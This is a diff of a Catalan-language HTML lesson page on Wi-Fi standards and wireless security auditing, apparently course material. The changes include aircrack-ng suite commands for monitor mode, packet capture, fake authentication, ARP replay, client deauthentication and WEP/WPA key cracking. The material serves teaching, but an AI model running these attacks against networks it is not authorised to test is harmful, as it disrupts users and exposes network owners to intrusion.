@@ -93,7 +93,7 @@
         <li>2024: WiFi7 o 802.11be. Velocitat teorica de 46 Gbps. Menor latència. Més eficiència en entorns congestionats</li>
     </ul>
     <p>La <strong>Wi-Fi Alliance</strong> és una organització internacional sense ànim de lucre que s’encarrega de garantir que els dispositius Wi-Fi 
-        funcionen correctament entre ells, encara que siguin de fabricants diferents. També dona noms comercials als estàndards, com: WiFi5, WiFi6,
+        funcionen correctament entre ells, encara que siguen de fabricants diferents. També dona noms comercials als estàndards, com: WiFi5, WiFi6,
     i certifica dispositius (routers, mòbils, ordinadors, IoT, etc.) perquè compleixin aquests estàndards. Quan veus el logotip “Wi-Fi CERTIFIED” 
     en un producte, vol dir que ha passat proves oficials de la Wi-Fi Alliance.</p>
 
@@ -291,11 +291,14 @@
     </ul>
 
     <h3>Establir targeta en mode monitor</h3>
+    <p>Totes estes comandes de la suite requeriran privilegis amb <code>sudo</code> o sent <code>root</code></p>
+    <p>Primer s'ha de localitzar el nom de la targeta, amb <code>iwconfig, iw, ip, </code></p>
+    <p>Si la targeta està connectada per USB, es pot usar la comanda <code>lsusb, lspci, lsblk</code></p>
     <pre>airmon-ng  start|stop|check  interficie  [channel or frequency]</pre>
     <p>Compte, quan es canvia a mode monitor, la interficie canvia de nom !</p>
 
     <h3>Descobriment de xarxes sense fil</h3>
-    <pre>airodump interficie</pre>
+    <pre>airodump-ng interficie</pre>
     <p>L'eixida d'airodump-ng mostra en primer lloc, els <strong>punts d'accés (AP)</strong>. <br> 
         A continuació, es mostra informació sobre <strong>els equips</strong> (STATION)
         connectats a punts d'accés (BSSID) o que han intentat identificar una xarxa en concret (Probe).     </p>
@@ -316,7 +319,7 @@
     <p>Una volta identificada la xarxa sobre la qual es desitja fer l'auditoria, es pot fer servir el comando <strong>airodump-ng </strong>
     amb l'opció --bssid per indicar la MAC del punt d'accés, o la opció --channel per indicar el canal que es desitja escoltar. 
     L'opció --write permet especificar el nom del fitxer on s'emmagatzemaran els paquets capturats</p>
-    <pre>airodump-ng --bssid aa:aa:aa:bb:00:01 --channel 1 --write captura wlan1</pre>
+    <pre>airodump-ng --bssid aa:aa:aa:bb:00:01 --channel 1 --write fitxer_captura wlan1</pre>
     <p>Si no s'indica la extensió del fitxer, es guardaran les captures en els diferents formats possibles (.cap .csv .kismet.csv .kismet.netxml)</p>
 
   <hr><h2>Atacs als protocols de seguretat</h2>
@@ -380,11 +383,12 @@
         <li>Es capturen trames i es guarden en un fitxer, ( i es deixa escoltant i capturant..)</li>
         <pre>airodump-ng --channel canal --bssid BSSID --write fitxer  wlan1</pre>
         <li>Associar-se al AP, per capturar una trama ARP, i enviar-la milers de vegades, per generar trànsit i IVs, per poder extraure la contrasenya</li>
-    </ol>
-    <pre># Autenticar-se en el AP
+            <pre># Autenticar-se en el AP
 aireplay-ng --fakeauth 0 -a BSSID -h la_teua_mac  wlan1
 # Capturar una paquet ARP, i se reenvia al AP
 aireplay-ng --arpreplay -b BSSID -h la_teua_mac  wlan1      </pre>
+    </ol>
+
 
     <p>Si es SDK</p>
     <ol>
@@ -393,13 +397,13 @@ aireplay-ng --arpreplay -b BSSID -h la_teua_mac  wlan1      </pre>
         <li>Es necessari capturar un "handshake". Esperem a que un client autentique o "tirem" fora un client, per forçar a que autentique</li>
         <li>Capturem el "handshake", i açò genera un fitxer .xor</li>
         <li>Associar-se al AP, per capturar una trama ARP, i enviar-la milers de vegades, per generar trànsit i IVs, per poder extraure la contrasenya</li>
-    </ol>
-    <pre># Desautenticar un client
+            <pre># Desautenticar un client
 aireplay-ng --deauth 1 -a BSSID -c mac_client  wlan1
 # Autenticar-se en el AP
 aireplay-ng --fakeauth 0 -y fitxer.xor -a BSSID -h la_teua_mac  wlan1
 # Capturar una paquet ARP , i se reenvia al AP
 aireplay-ng --arpreplay -b BSSID -h la_teua_mac  wlan1      </pre>
+    </ol>
 
         <p>En els dos casos, en altra terminal, es crackeja la contrasenya</p>
         <pre>aircrack-ng fitxer</pre>
@@ -415,6 +419,8 @@ aireplay-ng --arpreplay -b BSSID -h la_teua_mac  wlan1      </pre>
     <hr><h2>Atacs a WPA i WPA2</h2>
     <p>A diferència de les xarxes amb seguretat WEP, l'atac a xarxes amb segureta WPA o WPA2 no requereix de capturar molts paquets, 
         la informació important està en el <strong>handshake</strong> , conegut con 4-way-handshake     </p>
+        <pre>airodump-ng --channel canal --bssid BSSID --write fitxer  wlan1 
+            ** Primer es posa a capturar en una finestra apart          </pre>
         <pre>aireplay-ng --deauth 5 -a BSSID -c mac_client  wlan1</pre>
     <p>   Una vegada capturat el handshake, es realitza un atac de força bruta o diccionari per obtindre la clau o passowrd. Per tant, la seguretat 
         d'este tipus de xarxes resideix en la fortalesa de la clau.      </p> 
